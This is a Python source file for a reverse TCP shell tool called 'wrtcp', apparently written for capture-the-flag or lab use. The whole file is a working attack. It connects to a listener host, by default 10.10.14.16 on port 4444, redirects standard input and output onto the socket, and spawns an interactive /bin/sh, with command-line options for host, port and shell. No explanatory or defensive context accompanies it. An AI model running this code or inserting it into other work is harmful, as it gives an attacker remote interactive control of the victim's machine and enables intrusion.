#!/usr/bin/python

# author: WatchDogOblivion
# description: TODO
# WatchDogs Reverse TCP a.k.a wrtcp

import os
import socket
import argparse
import subprocess
import traceback


class WReverseTCP():

  VERSION = "1.0"
  EMPTY = ""

  def __init__(self, localHost="10.10.14.16", localPort=4444, shell="/bin/sh"):
    self.localHost = localHost  #type: str
    self.localPort = localPort  #type: int
    self.shell = shell  #type: str
    self.parser = None  #type: argparse.ArgumentParser
    self.parsedArgs = None  #type: argparse.Namespace

  @staticmethod
  def toCamelCase(string, delimiter="_"):  #type: (str, str) -> str
    camelCasedString = WReverseTCP.EMPTY
    strings = string.split(delimiter)
    stringsLength = len(strings)
    for index in range(stringsLength):
      word = strings[index]
      if (index == 0):
        camelCasedString += word.lower()
      else:
        camelCasedString += word[0].upper() + word[1:].lower()
    return camelCasedString

  def parseArgs(self):  #type: (WReverseTCP) -> None
    LH_HELP = "Specify your local ip address. Default is: {}".format(self.localHost)
    LP_HELP = "Specify your local port. Default is: {}".format(self.localPort)
    S_HELP = "Specify the shell to launch on successful reverse tcp. Default is: {}".format(self.shell)
    V_HELP = "Show version"
    H_HELP = "Show this help message"
    VERSION = "Reverse TCP version: {}".format(WReverseTCP.VERSION)
    EMPTY = WReverseTCP.EMPTY

    self.parser = argparse.ArgumentParser(add_help=False)
    parser = self.parser
    parser.add_argument("-lh", "--lhost", help=LH_HELP, type=str, metavar=EMPTY, default=self.localHost)
    parser.add_argument("-lp", "--lport", help=LP_HELP, type=int, metavar=EMPTY, default=self.localPort)
    parser.add_argument("-s", "--shell", help=S_HELP, type=str, metavar=EMPTY, default=self.shell)
    parser.add_argument("-v", "--version", action="version", help=V_HELP, version=VERSION)
    parser.add_argument("-h", "--help", action="help", help=H_HELP)
    self.parsedArgs = parser.parse_args()

  def setArguments(self):  #type: (WReverseTCP) -> None
    parsedArgsDict = vars(self.parsedArgs)
    for parsedArgsKey in parsedArgsDict:
      setattr(self, WReverseTCP.toCamelCase(parsedArgsKey), parsedArgsDict[parsedArgsKey])

  def reverseTCP(self):  #type: (WReverseTCP) -> None
    localHost = self.localHost
    localPort = self.localPort
    shell = self.shell
    print("Initiating connection: {}:{} {}".format(localHost, localPort, shell))

    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _socket.connect((localHost, localPort))
    os.dup2(_socket.fileno(), 0)
    os.dup2(_socket.fileno(), 1)
    os.dup2(_socket.fileno(), 2)
    subprocess.call([shell, "-i"])


def __main__():  #type: () -> None
  wrtcp = WReverseTCP()
  try:
    wrtcp.parseArgs()
    wrtcp.setArguments()
    wrtcp.reverseTCP()
  except ValueError as ve:
    print(ve)
    print(wrtcp.parser.print_usage())
  except Exception:
    print(traceback.format_exc())
    print(wrtcp.parser.print_usage())


__main__()
